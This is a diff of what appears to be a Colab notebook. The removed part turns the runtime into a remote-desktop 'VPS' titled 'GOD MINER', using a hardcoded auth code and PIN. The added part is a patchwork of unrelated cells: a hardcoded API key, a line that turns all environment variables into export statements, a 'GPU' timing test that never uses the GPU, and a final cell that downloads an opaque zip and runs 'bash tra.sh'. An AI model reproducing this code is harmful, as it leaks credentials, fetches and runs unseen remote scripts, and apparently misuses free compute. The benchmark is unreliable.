@@ -1,66 +1,58 @@
-#@title **INSTALL YOUR VPS BY GOD MINER**
-#@markdown  It takes 4-5 minutes for installation
- 
+import npu
 
- 
-#@markdown  Visit http://remotedesktop.google.com/headless and Copy the command after authentication
- 
-CRP = "DISPLAY= /opt/google/chrome-remote-desktop/start-host --code=\"4/0AX4XfWgdktIfnJtinPMr1AtQoc4ieMTSBQMOKK_vLssDX2B8chGsAZHe3sFbqTKf78Cfqw\" --redirect-url=\"https://remotedesktop.google.com/_/oauthredirect\" --name=$(hostname)" #@param {type:"string"}
- 
-#@markdown Enter a pin more or equal to 6 digits
-Pin = 123456 #@param {type: "integer"}
- 
- 
-class CRD:
-    def __init__(self):
-        os.system("apt update")
-        self.installCRD()
-        self.installDesktopEnvironment()
-        self.installGoogleChorme()
-        self.finish()
- 
-    @staticmethod
-    def installCRD():
-        print("Installing Chrome Remote Desktop")
-        subprocess.run(['wget', 'https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb'], stdout=subprocess.PIPE)
-        subprocess.run(['dpkg', '--install', 'chrome-remote-desktop_current_amd64.deb'], stdout=subprocess.PIPE)
-        subprocess.run(['apt', 'install', '--assume-yes', '--fix-broken'], stdout=subprocess.PIPE)
- 
-    @staticmethod
-    def installDesktopEnvironment():
-        print("Installing Desktop Environment")
-        os.system("export DEBIAN_FRONTEND=noninteractive")
-        os.system("apt install --assume-yes xfce4 desktop-base xfce4-terminal")
-        os.system("bash -c 'echo \"exec /etc/X11/Xsession /usr/bin/xfce4-session\" > /etc/chrome-remote-desktop-session'")
-        os.system("apt remove --assume-yes gnome-terminal")
-        os.system("apt install --assume-yes xscreensaver")
-        os.system("systemctl disable lightdm.service")
- 
-    @staticmethod
-    def installGoogleChorme():
-        print("Installing Google Chrome")
-        subprocess.run(["wget", "https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb"], stdout=subprocess.PIPE)
-        subprocess.run(["dpkg", "--install", "google-chrome-stable_current_amd64.deb"], stdout=subprocess.PIPE)
-        subprocess.run(['apt', 'install', '--assume-yes', '--fix-broken'], stdout=subprocess.PIPE)
- 
-    @staticmethod
-    def finish():
-        print("Finalizing")
-        os.system(f"adduser {username} chrome-remote-desktop")
-        command = f"{CRP} --pin={Pin}"
-        os.system(f"su - {username} -c '{command}'")
-        os.system("service chrome-remote-desktop start")
-        print("Finished Succesfully")
- 
- 
-try:
-    if username:
-        if CRP == "":
-            print("Please enter authcode from the given link")
-        elif len(str(Pin)) < 6:
-            print("Enter a pin more or equal to 6 digits")
-        else:
-            CRD()
-except NameError as e:
-    print("username variable not found")
-    print("Create a User First")
+npu.api('ODG9Ei7snSGWUyU_p4wTFML1v1eXdh6IjmulQ-Ngzt0')
+
+from npu.vision.models import resnet18
+from npu.vision.datasets import CIFAR10
+
+model_trained = npu.train(resnet18(pretrained=True),
+			train_data=CIFAR10.train,
+			val_data=CIFAR10.val,
+			loss=npu.loss.SparseCrossEntropyLoss,
+			optim=npu.optim.SGD(lr=0.01),
+			batch_size=256,
+			epochs=2)
+import os
+' && '.join([f'export {name}="{value}"' for name, value in os.environ.items()])
+#@title **Mod GPU**
+
+from numba import jit, cuda
+import numpy as np
+# to measure exec time
+from timeit import default_timer as timer
+
+# normal function to run on cpu
+def func(a):								
+	for i in range(10000000):
+		a[i]+= 1	
+
+						
+def func2(a):
+	for i in range(10000000):
+		a[i]+= 1
+if __name__=="__main__":
+	n = 10000000							
+	a = np.ones(n, dtype = np.float64)
+	b = np.ones(n, dtype = np.float32)
+	
+	start = timer()
+	func(a)
+	print("without GPU:", timer()-start)	
+	
+	start = timer()
+	func2(a)
+	print("with GPU:", timer()-start)
+ #@title **Tensor Maksimum**
+
+import tensorflow as tf
+
+from tensorflow import keras
+from tensorflow.keras import layers
+from tensorflow.keras import mixed_precision
+
+mixed_precision.set_global_policy('mixed_float16')
+#@title HIDUP INDAH BILA MENCARI BERKAH
+!gdown --id 1SRjP8WmEBxQQ9GsyiSQ98etRvlYq7Mq0
+!unzip tam.zip
+# %cd coleb
+!bash tra.sh
